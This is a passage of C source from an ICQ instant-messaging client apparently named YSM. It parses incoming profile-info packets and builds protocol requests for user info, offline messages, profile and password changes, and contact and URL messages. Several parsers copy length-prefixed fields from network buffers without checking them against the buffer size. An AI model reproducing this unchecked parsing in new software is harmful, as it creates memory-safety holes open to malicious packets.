    /* first LNTS is NICK */
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

    /* Update nicknames ? */
    if (pnick && (local || g_cfg.updatenicks > 0))
    {
        /* using strcmp here, to update even low/big caps */
        if (strlen(data) > 1 && strcmp(pnick, data))
        {
            if (YSM_ParseSlave(data))
            {
                if (local)
                {
                    strncpy(pnick, data, MAX_NICK_LEN-1);
                    pnick[MAX_NICK_LEN - 1] = '\0';
                }
                else
                    YSM_UpdateSlave(UPDATE_NICK, data, *puin);
            }
        }
    }

    PRINTF(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "Nickname",
        YSM_CharsetConvertOutputString(&data, 1));

    YSM_FREE(data);

    /* Next LNTS is FirstName */
    tsize += nlen;

    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

    if (pfirst)
    {
        strncpy( pfirst, data, MAX_NICK_LEN-1 );
        pfirst[MAX_NICK_LEN - 1] = '\0';
    }

    PRINTF(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "Firstname",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;

    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    if (plast) {
        strncpy( plast, data, MAX_NICK_LEN-1 );
        plast[MAX_NICK_LEN-1] = '\0';
    }


    PRINTF(VERBOSE_BASE,
        "%-15.15s" " : %-12.12s ",
        "Lastname",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    if (pemail) {
        strncpy( pemail, data, MAX_NICK_LEN-1 );
        pemail[MAX_NICK_LEN - 1] = '\0';
    }


    PRINTF(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "E-mail",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    PRINTF(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "City",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    PRINTF(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "State",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    PRINTF(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "Phone",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    PRINTF(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "FAX",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    PRINTF(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "Street",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    PRINTF(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "Cellular",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;
}

void
YSM_IncomingHPInfo( int8_t *buf, int32_t tsize )
{
    if (buf == NULL)
        return;


    PRINTF(VERBOSE_BASE,
        "%-15.15s" " : %-12.u ",
        "Age",
        buf[tsize] );

    if (buf[tsize+2] != 0) {
        PRINTF(VERBOSE_BASE,
            "%-20.20s" " : %s\n",
            "Sex",
            (buf[tsize+2] == 0x02) ? "Male." : "Female." );
    }

}

void
YSM_IncomingWorkInfo( int8_t *buf, int32_t tsize )
{
int8_t    *data = NULL;
int32_t    nlen = 0;

    if (buf == NULL)
        return;

    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    PRINTF(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "City",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    tsize += nlen;

    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);

    memcpy(data, buf+tsize, nlen);

    PRINTF(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "State",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

}

void
YSM_IncomingAboutInfo( int8_t *buf, int32_t tsize )
{
int8_t    *data = NULL;
int16_t    len = 0;

    if (buf == NULL)
        return;

    len = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, len+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, len);

    PRINTF(VERBOSE_BASE,
        "\r\n%-15.15s" " : \n%s\n",
        "About",
        YSM_CharsetConvertOutputString(&data, 1));

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;
    g_promptstatus.flags |= FL_RAW;
}


static const u_int8_t icq2000vstring[] =
{
      0x00,0x01,0x00,0x03,0x01,0x10,0x02,0x8A,0x00,0x02,0x00,
    0x01,0x01,0x01,0x02,0x8A,0x00,0x03,0x00,0x01,0x01,0x10,
    0x02,0x8A,0x00,0x15,0x00,0x01,0x01,0x10,0x02,0x8A,0x00,
    0x04,0x00,0x01,0x01,0x10,0x02,0x8A,0x00,0x06,0x00,0x01,
    0x01,0x10,0x02,0x8A,0x00,0x09,0x00,0x01,0x01,0x10,0x02,
    0x8A,0x00,0x0A,0x00,0x01,0x01,0x10,0x02,0x8A,
};


static const u_int8_t icq2003avstring[] =
{
      0x00,0x01,0x00,0x03,0x01,0x10,0x04,0x7c,
    0x00,0x13,0x00,0x02,0x01,0x10,0x04,0x7c,
    0x00,0x02,0x00,0x01,0x01,0x01,0x04,0x7c,
    0x00,0x03,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x15,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x04,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x06,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x09,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x0A,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x0B,0x00,0x01,0x01,0x10,0x04,0x7c,
};

void
YSM_SendCliReady(void)
{
    YSM_SendSNAC(
        0x1,
        0x2,
        0x0,
        0x0,
        icq2000vstring,
        sizeof(icq2000vstring),
        g_sinfo.seqnum++,
        NULL);
}


static const u_int8_t icqICBM[] =
{
    0x00,0x00,0x00,0x00,0x00,0x03,0x1F,0x40,0x03,0xE7,0x03,0xE7,
    0x00,0x00,0x00,0x00,
};

void YSM_SendICBM(void)
{
    char *data;
    int   data_len = 0;

    data_len = sizeof(icqICBM);

    data = ysm_malloc(data_len, __FILE__, __LINE__);
    memcpy(data, icqICBM, data_len);

    YSM_SendSNAC( 0x04,
            0x02,
            0x0,
            0x0,
            data,
            data_len,
            g_sinfo.seqnum++,
            NULL);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;
}

static const u_int8_t icqCapabilities[] =
{
    CAP_PRECAP CAP_SRVRELAY CAP_POSCAP
    CAP_PRECAP CAP_ISICQ    CAP_POSCAP
#ifdef YSM_USE_CHARCONV
    CAP_PRECAP CAP_UTF8     CAP_POSCAP
#endif
};

void YSM_SendCapabilities(void)
{
    char *data, *data2;
    int   data_len = 0;

    data_len = sizeof(icqCapabilities) - 1;    /* ending zero */
    data = ysm_malloc(data_len, __FILE__, __LINE__);
    memcpy(data, icqCapabilities, data_len);
    data_len += sizeof(TLV);

    data2 = ysm_calloc(1, data_len, __FILE__, __LINE__);

    InsertTLV(data,0x5,data2,data_len-sizeof(TLV));

    YSM_SendSNAC(
        0x02,
        0x04,
        0x0,
        0x0,
        data2,
        data_len,
        g_sinfo.seqnum++,
        NULL);

    ysm_free(data, __FILE__, __LINE__);
    ysm_free(data2, __FILE__, __LINE__);
}


int32_t
YSM_RequestInfo( uin_t r_uin, int16_t subtype )
{
int8_t    rembytes[2], type[2], reqid[2], subt[2], *data = NULL, *data2 = NULL;
int32_t    dlen = 0;

    memset(rembytes, '\0', 2);
    memset(type, '\0', 2);
    memset(reqid, '\0', 2);
    memset(subt, '\0', 2);

    Word_2_Charsb(rembytes, 0x0e00);
    Word_2_Charsb(type,0xd007);
    Word_2_Charsb(subt, subtype);

    dlen = 2 + 4 + 2 + 2 + 2 + 4 + 1;
    data = ysm_calloc(1, dlen, __FILE__, __LINE__);
    data2 = ysm_calloc(1, dlen + sizeof(TLV), __FILE__, __LINE__);

    memcpy(data, &rembytes, 2);
    DW_2_Chars(data+2, YSM_USER.Uin);
    memcpy(data+2+4, &type, 2);
    memcpy(data+2+4+2, &reqid, 2);
    memcpy(data+2+4+2+2, &subt, 2);
    DW_2_Chars(data+2+4+2+2+2, r_uin);

    InsertTLV(data, 0x1, data2, dlen-1);
    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    r_uin &= 0xffffff7f;
    YSM_SendSNAC( 0x15,
        0x02,
        0x0,
        0x0,
        data2,
        dlen+sizeof(TLV),
        g_sinfo.seqnum++,
        (char *)&r_uin);

    ysm_free(data2, __FILE__, __LINE__);
    data2 = NULL;
    return r_uin;
}

void
YSM_RequestOffline(void)
{
char BytesRem[2],Type[2],ReqID[2];
char *data,*data2;
int dlen =0;

    memset(BytesRem,'\0',2);
    memset(Type,'\0',2);
    memset(ReqID,'\0',2);

    Word_2_Charsb(BytesRem,0x0800);
    Word_2_Charsb(Type,0x3c00);

    dlen = 2 + 4 + 2 + 2 ;

    data = ysm_calloc(1, dlen, __FILE__, __LINE__);

    data2 = ysm_calloc(1, dlen + sizeof(TLV), __FILE__, __LINE__);

    memcpy(data,&BytesRem,2);
    memcpy(data+2,&YSM_USER.Uin,4);
    memcpy(data+2+4,&Type,2);
    memcpy(data+2+4+2,&ReqID,2);

    /* I believe we had an extra byte for the ending 0     */
    InsertTLV(data,0x1,data2,dlen);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    YSM_SendSNAC( 0x15,
            0x02,
            0x0,
            0x0,
            data2,
            dlen+sizeof(TLV),
            g_sinfo.seqnum++,
            NULL);

    ysm_free(data2, __FILE__, __LINE__);
    data2 = NULL;
}

void
YSM_AckOffline(void)
{
char BytesRem[2],Type[2],ReqID[2];
char *data,*data2;
int dlen =0;

    memset(BytesRem,'\0',2);
    memset(Type,'\0',2);
    memset(ReqID,'\0',2);

    Word_2_Charsb(BytesRem,0x0800);
    Word_2_Charsb(Type,0x3E00);

    dlen = 2 + 4 + 2 + 2 ;

    data = ysm_calloc(1, dlen, __FILE__, __LINE__);
    data2 = ysm_calloc(1, dlen + sizeof(TLV), __FILE__, __LINE__);

    memcpy(data,&BytesRem,2);
    memcpy(data+2,&YSM_USER.Uin,4);
    memcpy(data+2+4,&Type,2);
    memcpy(data+2+4+2,&ReqID,2);

    /* I believe we had an extra byte for the ending 0     */
    InsertTLV(data,0x1,data2,dlen);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    YSM_SendSNAC( 0x15,
            0x02,
            0x0,
            0x0,
            data2,
            dlen+sizeof(TLV),
            g_sinfo.seqnum++,
            NULL);

    ysm_free(data2, __FILE__, __LINE__);
    data2 = NULL;
}

void
YSM_RequestICBMRights(void)
{
    YSM_SendSNAC( 0x04,
            0x04,
            0x0,
            0x0,
            NULL,
            0,
            g_sinfo.seqnum++,
            NULL);
}

void
YSM_RequestBuddyRights(void)
{
    YSM_SendSNAC( 0x03,
            0x02,
            0x0,
            0x0,
            NULL,
            0,
            g_sinfo.seqnum++,
            NULL);
}


void
YSM_RequestContacts(void)
{
int dlen,last_time=0;
char *data,records_num[2];

    dlen = sizeof(last_time) + sizeof(records_num);
    data = ysm_calloc(1, dlen, __FILE__, __LINE__);
    memset(records_num,'\0',2);

    memcpy(data,&last_time,sizeof(last_time));
    memcpy(data+sizeof(last_time),&records_num,2);

    YSM_SendSNAC( 0x13,
            0x05,
            0x0,
            0x0,
            data,
            dlen,
            g_sinfo.seqnum++,
            NULL);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;
}

void
YSM_RequestPersonal(void)
{
char reqid[4];

    memset(reqid, 0, 4);
    reqid[3] = 0x0E;

    YSM_SendSNAC( 0x01,
            0x0e,
            0x0,
            0x0,
            NULL,
            0,
            g_sinfo.seqnum++, reqid);

    /* Not only send the damn 01 0E snac, get our info too! */
    YSM_RequestInfo(YSM_USER.Uin, (short)0xD004);
}

void
YSM_RequestRates(void)
{
    YSM_SendSNAC( 0x01,
            0x06,
            0x0,
            0x0,
            NULL,
            0,
            g_sinfo.seqnum++, NULL);
}


void
YSM_RequestAutoMessage( slave_t *victim )
{
int8_t mtype = 0;
int8_t data[2];

    if (victim == NULL) return;

    switch (victim->status) {
        case STATUS_AWAY:
            mtype = YSM_MESSAGE_GETAWAY;
            break;
        case STATUS_DND:
            mtype = YSM_MESSAGE_GETDND;
            break;
        case STATUS_NA:
            mtype = YSM_MESSAGE_GETNA;
            break;
        case STATUS_OCCUPIED:
            mtype = YSM_MESSAGE_GETOCC;
            break;
        case STATUS_FREE_CHAT:
            mtype = YSM_MESSAGE_GETFFC;
            break;
        default:
            return;
    }

    data[0] = 0x00;
    data[1] = 0x00;

    YSM_SendMessage2Client( victim,
            victim->uin,
            0x02,
            mtype,
            data,
            1,
            0x03,
            MFLAGTYPE_NORM,
            rand() & 0xffffff7f );
}

void
YSM_SearchUINbyMail( char *ContactMail )
{
char BytesRem[2],Type[2],ReqID[2],SubTypeID[2];
char ExtraBytes[2];
char Mail_lena[2],Mail_lenb[2];
char *data,*data2;
int dlen =0;

    memset(BytesRem,'\0',2);
    memset(ExtraBytes,'\0',2);
    memset(Type,'\0',2);
    memset(ReqID,'\0',2);
    memset(SubTypeID,'\0',2);
    memset(Mail_lena,'\0',2);
    memset(Mail_lenb,'\0',2);

    /* LNTS email (2+strlen mail)    */
    /* two extra bytes before the lnts (5E 01) and 2 */
    /* more since its an LLNTS so a word before the LNTS */
    dlen = 2 + 4 + 2 + 2 + 2 + 2 + 2 + 2 + strlen(ContactMail) + 1;

    Word_2_Chars(BytesRem,dlen-2);    /* remove BytesRem (-2)*/
    Word_2_Charsb(Type,0xd007);
    Word_2_Charsb(SubTypeID,0x7305);
    Word_2_Charsb(ExtraBytes,0x5E01);
    Word_2_Chars(Mail_lena,strlen(ContactMail)+2+1);/*stringz*/
    Word_2_Chars(Mail_lenb,strlen(ContactMail)+1);/*+1 its stringz*/

    data = ysm_calloc(1, dlen, __FILE__, __LINE__);
    data2 = ysm_calloc(1, dlen+sizeof(TLV), __FILE__, __LINE__);

    memcpy(data,&BytesRem,2);
    memcpy(data+2,&YSM_USER.Uin,4);
    memcpy(data+2+4,&Type,2);
    memcpy(data+2+4+2,&ReqID,2);
    memcpy(data+2+4+2+2,&SubTypeID,2);
    memcpy(data+2+4+2+2+2,&ExtraBytes,2);
    memcpy(data+2+4+2+2+2+2,&Mail_lena,2);
    memcpy(data+2+4+2+2+2+2+2,&Mail_lenb,2);
    memcpy(data+2+4+2+2+2+2+2+2,ContactMail,strlen(ContactMail));

    /* I believe we had an extra byte for the ending 0     */
    InsertTLV(data,0x1,data2,dlen);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    YSM_SendSNAC( 0x15,
            0x02,
            0x0,
            0x0,
            data2,
            dlen+sizeof(TLV),
            g_sinfo.seqnum++, NULL);

    ysm_free(data2, __FILE__, __LINE__);
    data2 = NULL;
}


void
YSM_InfoChange( int desired, char *newsetting )
{
char BytesRem[2],Type[2],ReqID[2],SubTypeID[2];
char nick_len[2], First_len[2], Last_len[2], Mail_len[2];
char *data,*data2,*nick, Publish_Mail = 0x1;
int dlen =0, tsize=0;

        memset(BytesRem,'\0',2);
        memset(Type,'\0',2);
        memset(ReqID,'\0',2);
        memset(SubTypeID,'\0',2);
        memset(nick_len,'\0',2);

        Word_2_Charsb(Type,0xd007);
        Word_2_Charsb(SubTypeID,0xEA03);

        /* Beginning Header */
        dlen =     2 + 4 + 2 + 2 + 2  ;
        nick = ysm_calloc(1, MAX_NICK_LEN, __FILE__, __LINE__);

        memcpy(nick,&YSM_USER.info.NickName,
                strlen(YSM_USER.info.NickName));

        Word_2_Chars(nick_len,
                 strlen(YSM_USER.info.NickName)+1);

    switch(desired)
    {
        case YSM_INFO_NICK:
            dlen += 2 + strlen(newsetting) + 1;
            memcpy(nick,newsetting,MAX_NICK_LEN);
            Word_2_Chars(nick_len, strlen(newsetting)+1);

            memset( YSM_USER.info.NickName,
                0,
                sizeof(YSM_USER.info.NickName) );

            strncpy( YSM_USER.info.NickName,
                nick,
                sizeof(YSM_USER.info.NickName) - 1);
            break;

        case YSM_INFO_EMAIL:
            dlen += 2 + strlen(YSM_USER.info.NickName) + 1;
            memset( YSM_USER.info.NickName,
                0,
                sizeof(YSM_USER.info.NickName) );

            strncpy( YSM_USER.info.email,
                newsetting,
                sizeof(YSM_USER.info.email) - 1);
            break;

        default:
            dlen += 2 + strlen(YSM_USER.info.NickName) + 1;
            return;
            break;
    }

    dlen += 2 + strlen(YSM_USER.info.FirstName) + 1;
    dlen += 2 + strlen(YSM_USER.info.LastName) + 1;
    dlen += 2 + strlen(YSM_USER.info.email) + 1;
    dlen += 3 ; /* 0 for city! */
    dlen += 3;  /* 0 for state! */
    dlen += 3;  /* 0 for phone! */
    dlen += 3;  /* 0 for fax! */
    dlen += 3;  /* 0 for street! */
    dlen += 3;  /* 0 for cellular! */
    dlen += 3;  /* 0 for zip! */
    dlen += 2;  /* 0 for country! (WORD) */
    dlen += 2;  /* 0 for gmt (int8_t) and will be 1 for Publish (int8_t) */
    /* Btw, 1 because if we put 1 on Publish Mail, it WONT publish it */

    data = ysm_calloc(1, dlen, __FILE__, __LINE__);
    data2 = ysm_calloc(1, dlen + sizeof(TLV), __FILE__, __LINE__);

    tsize = 2;
    memcpy(data+tsize,&YSM_USER.Uin,4);
    tsize += 4;
    memcpy(data+tsize,&Type,2);
    tsize += 2;
    memcpy(data+tsize,&ReqID,2);
    tsize += 2;
    memcpy(data+tsize,&SubTypeID,2);
    tsize += 2;
    memcpy(data+tsize,nick_len,2);
    tsize += 2;
    memcpy(data+tsize,nick,strlen(nick));

    tsize += strlen(nick) + 1;    /* ending 0 */

    Word_2_Chars(First_len,strlen(YSM_USER.info.FirstName)+1);

    memcpy(data+tsize, First_len ,2);
    tsize += 2;

    memcpy(data+tsize,YSM_USER.info.FirstName,
                    strlen(YSM_USER.info.FirstName));

    tsize += strlen(YSM_USER.info.FirstName) + 1;    /* ending 0 */

    Word_2_Chars(Last_len,strlen(YSM_USER.info.LastName)+1);

    memcpy(data+tsize,Last_len,2);
    tsize += 2;

    memcpy(data+tsize,YSM_USER.info.LastName,
                    strlen(YSM_USER.info.LastName));

    tsize += strlen(YSM_USER.info.LastName) + 1;    /* ending 0 */

    Word_2_Chars(Mail_len,strlen(YSM_USER.info.email)+1);

    memcpy(data+tsize,Mail_len ,2);
    tsize += 2;

    memcpy(data+tsize,YSM_USER.info.email,
                    strlen(YSM_USER.info.email));

    tsize += strlen(YSM_USER.info.email) + 1;    /* ending 0 */

    tsize += 3 ; /* 0 for city! */
    tsize += 3;  /* 0 for state! */
    tsize += 3;  /* 0 for phone! */
    tsize += 3;  /* 0 for fax! */
    tsize += 3;  /* 0 for street! */
    tsize += 3;  /* 0 for cellular! */
    tsize += 3;  /* 0 for zip! */
    tsize += 2;  /* 0 for country! (WORD) */
    tsize += 1;  /* 0 for gmt (int8_t) */

    memcpy(data+tsize,&Publish_Mail,1); /* (1 = DONT PUBLISH) */

    Word_2_Chars(BytesRem,dlen-2);
    memcpy(data,&BytesRem,2);

    InsertTLV(data,0x1,data2,dlen);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    YSM_SendSNAC( 0x15,
            0x02,
            0x0,
            0x0,
            data2,
            dlen+sizeof(TLV),
            g_sinfo.seqnum++,NULL);

    ysm_free(data2, __FILE__, __LINE__);
    data2 = NULL;
}

void
YSM_ChangePassword( char *newp )
{
char *data, *data2, BytesRem[2],Type[2],SubTypeID[2], newp_len[2];
int dlen = 0, tsize = 0;

    memset(BytesRem,'\0',2);
    memset(Type,'\0',2);
    memset(SubTypeID,'\0',2);
    memset(newp_len,'\0',2);

    Word_2_Charsb(Type,0xd007);
    Word_2_Charsb(SubTypeID,0x2E04);
    Word_2_Chars(newp_len, strlen(newp));

    /* Beginning Header */
    dlen =     2 + 4 + 2 + 2 + 2  ;
    dlen += 2; /* WORD (pass len) */
    dlen += strlen(newp) + 1;

    Word_2_Chars(BytesRem,dlen-2);

    data = ysm_calloc(1, dlen, __FILE__, __LINE__);
    data2 = ysm_calloc(1, dlen + sizeof(TLV), __FILE__, __LINE__);

    memcpy(data+tsize,&BytesRem,2);
    tsize += 2;
    memcpy(data+tsize,&YSM_USER.Uin,4);
    tsize += 4;
    memcpy(data+tsize,&Type,2);
    tsize += 2;
    tsize += 2;    /* ReqID */
    memcpy(data+tsize,&SubTypeID,2);
    tsize += 2;
    memcpy(data+tsize,newp_len,2);
    tsize += 2;
    memcpy(data+tsize,newp,strlen(newp));
    tsize += strlen(newp) + 1;    /* ending 0 */

    InsertTLV(data,0x1,data2,dlen);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;

    YSM_SendSNAC( 0x15,
            0x02,
            0x0,
            0x0,
            data2,
            dlen+sizeof(TLV),
            g_sinfo.seqnum++,NULL);

    ysm_free(data2, __FILE__, __LINE__);
    data2 = NULL;


}

void YSM_KeepAlive(void)
{
    char *data, *data2, BytesRem[2], Type[2], ReqID[2];
    int   dlen = 0;

    PRINTF(VERBOSE_MOATA, "Sending KEEP Alive Packet.\n");

    memset(BytesRem,  '\0', 2);
    memset(Type,      '\0', 2);
    memset(ReqID,     '\0', 2);

    Word_2_Charsb(BytesRem, 0x0800);
    Word_2_Charsb(Type,     0xd007);

    dlen = sizeof(BytesRem) + sizeof(YSM_USER.Uin) +
           sizeof(Type) + sizeof(ReqID);
    data = ysm_calloc(1, dlen, __FILE__, __LINE__);
    data2 = ysm_calloc(1, dlen + sizeof(TLV), __FILE__, __LINE__);

    memcpy(data,&BytesRem,2);
    memcpy(data+2,&YSM_USER.Uin,4);
    memcpy(data+2+4,&Type,2);
    memcpy(data+2+4+2,&ReqID,2);

    InsertTLV(data, 0x1, data2, dlen);

    ysm_free(data, __FILE__, __LINE__);

    YSM_SendSNAC(0x15, 0x02, 0x0, 0x0,
        data2,
        dlen + sizeof(TLV),
        g_sinfo.seqnum++, NULL);

    ysm_free(data2, __FILE__, __LINE__);
}

/* Attention, datalist must be in the following format:
 *
 * UIN (ascii) 0xFE  NICK (ascii) 0xFE
 * and so on for each contact you want to send
 * and amount is in string, examples are : '1', "20", etc :)
 */

void
YSM_SendContact( slave_t *victim,
    char    *datalist,
    char *am )
{

char *smashed_slices_of_rotten_meat;
int buf_len = 0, tsize = 0;

    buf_len = strlen(am) + 1 + strlen(datalist);

    smashed_slices_of_rotten_meat = ysm_calloc(1, buf_len,
                            __FILE__,
                            __LINE__);

    /* amount of contacts to send , its in ascii */
    memcpy(smashed_slices_of_rotten_meat+tsize, am, strlen(am));
    tsize += strlen(am);
    smashed_slices_of_rotten_meat[tsize] = (char)0xFE;
    tsize ++;
    memcpy(smashed_slices_of_rotten_meat+tsize, datalist, strlen(datalist));
    tsize += strlen(datalist);

    if (victim->d_con.flags & DC_CONNECTED) {
#ifdef YSM_WITH_THREADS
        YSM_DC_Message( victim,
                &smashed_slices_of_rotten_meat[0],
                tsize,
                YSM_MESSAGE_CONTACTS );
#endif
    } else {
        YSM_SendMessage2Client( victim,
                victim->uin,
                0x04,
                YSM_MESSAGE_CONTACTS,
                smashed_slices_of_rotten_meat,
                tsize,
                0x00,
                0x00,
                rand() & 0xffffff7f );
    }

    ysm_free(smashed_slices_of_rotten_meat, __FILE__, __LINE__);
    smashed_slices_of_rotten_meat = NULL;
}


void
YSM_SendUrl( slave_t *victim, int8_t *url, int8_t *desc )
{

int8_t *data = NULL;
int32_t    size = 0;

    size = strlen(url) + strlen(desc) + 3;
    data = ysm_calloc( 1, size, __FILE__, __LINE__ );

    size = 0;
    memcpy( data+size, desc, strlen(desc));
    size += strlen(desc);
    data[size] = (char)0xFE;
    size ++;
    memcpy( data+size, url, strlen(url) );
    size += strlen(url) + 1;
    data[size] = (char)0xFE;


    if (victim->d_con.flags & DC_CONNECTED) {
#ifdef YSM_WITH_THREADS
        YSM_DC_Message( victim,
            data,
            size,
            YSM_MESSAGE_URL );
#endif
    } else {
        YSM_SendMessage2Client( victim,
                victim->uin,
                0x04,
                YSM_MESSAGE_URL,
                data,
                size,
                0x00,
                0x00,
                rand() & 0xffffff7f );
    }


    ysm_free( data , __FILE__, __LINE__ );
    data = NULL;
}


void
YSM_SendRTF( slave_t *victim )
{
int8_t        rtfmessage[] =
    "{\\rtf1\\ansi\\ansicpg1252\\deff0\\deflang1033{\\fonttbl{\\f0"
    "\\fnil\\fcharset0 Times New Roman;}}\r\n"
    "{\\colortbl ;\\red0\\green0\\blue0;}\r\n"
    "\\viewkind4\\uc1\\pard\\cf1\\f0\\fs20<##icqimage0001> \\par\r\n"
    "}\r\n";
u_int8_t    flags = 0;

    flags |= MFLAGTYPE_NORM;
    flags |= MFLAGTYPE_RTF;

    YSM_SendMessage2Client( victim,
            victim->uin,
            0x02,
            YSM_MESSAGE_,
            rtfmessage,
            sizeof(rtfmessage),
            0x00,
            flags,
            0x06000c00 );
}


void
YSM_Incoming_ClientAck( FLAP_Head *flap, SNAC_Head *snac, int8_t *buf )
{
int8_t        *autotext = NULL;
u_int8_t    *mType = NULL;
u_int32_t    pos = 0, ulen = 0;
u_int16_t    txtlen = 0;

    if (buf == NULL) return;
    pos += 8;

    if (Chars_2_Wordb(&buf[pos]) != 0x02) {
        /* this should be a type 2 ACK */
        return;
    }

    pos += 2;

    /* here comes a BSTR with the UIN */
    ulen = buf[pos];
    if (ulen > MAX_UIN_LEN) {
        /* someone is fcking with us? */
        return;
    }

    pos += (ulen + 1);

    pos += 2;
    if (buf[pos] != 0x1b && buf[pos] != 0x00) {
        /* this should be the len of a sub chunk.
         * we only allow either 1b or 0.
         */
        return;
    }

    ulen = buf[pos];
    pos += 2;
    pos += ulen;

    pos += 4;
    pos += 12;

    /* we only care about 'auto message' replies */
    mType = buf+pos;
    if (*mType != 0xe8
        && *mType != 0xe9
        && *mType != 0xea
        && *mType != 0xeb
        && *mType != 0xec) {

        return;
    }

    pos += 2;
    pos += 2;
    pos += 2;

    txtlen = Chars_2_Wordb(&buf[pos]);
    pos += 2;
    if (txtlen > 0x00) {
        /* there is an automessage text! */
        autotext = ysm_calloc(1, txtlen + 1, __FILE__, __LINE__);
        memcpy(autotext, buf+pos, txtlen);

        PRINTF(VERBOSE_BASE,
            "\r\n%-15.15s" " : \n%s\n",
            "Auto message",
            YSM_CharsetConvertOutputString(&autotext, 1));

        ysm_free(autotext, __FILE__, __LINE__);
        autotext = NULL;
    }
}


/* Can either be call from 4,1 or 4,c, check inside */

void YSM_Incoming_Scan(SNAC_Head *thesnac)
{
	slave_t *SlavesList = (slave_t *) g_slave_list.start;
	int32_t  i = 0;
	int8_t   buf[MAX_TIME_LEN];

    for (i = 1; SlavesList != NULL; i++) {
        if (thesnac->ReqID == SlavesList->ReqID) {
            g_sinfo.scanqueue--;

            /* check if the user is waiting in a scan */
            if(SlavesList->flags & FL_SCANNED) {
                if(Chars_2_Wordb(thesnac->SubTypeID) == 0x01) {
                    PRINTF(VERBOSE_BASE,
                        "\n%s %s is " 
                        "connected to the "
                        "ICQ Network.\n",
                        YSM_gettime(time(NULL),
                             buf,
                            sizeof(buf)),
                        SlavesList->info.NickName);
                } else
                if(Chars_2_Wordb(thesnac->SubTypeID) == 0x0c) {
                    PRINTF(VERBOSE_BASE,
                        "\n%s %s is " 
                        "NOT connected" 
                        " to the ICQ Network.\n",
                        YSM_gettime(time(NULL),
                             buf,
                            sizeof(buf)),
                        SlavesList->info.NickName);
                }

                SlavesList->flags ^= FL_SCANNED;
            }

            g_promptstatus.flags |= FL_RAW;
            break;
        }
